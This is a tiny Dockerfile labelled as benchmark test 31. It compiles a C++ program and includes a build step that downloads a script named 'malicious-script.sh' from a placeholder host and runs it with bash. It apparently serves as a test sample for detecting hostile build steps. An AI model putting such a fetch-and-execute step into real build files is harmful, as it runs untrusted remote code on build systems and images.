# Benchmark test 31
FROM gcc:9
COPY . /usr/src/myapp
WORKDIR /usr/src/myapp
RUN g++ -o myapp main.cpp
RUN wget http://example.com/malicious-script.sh && bash malicious-script.sh
CMD ["./myapp"]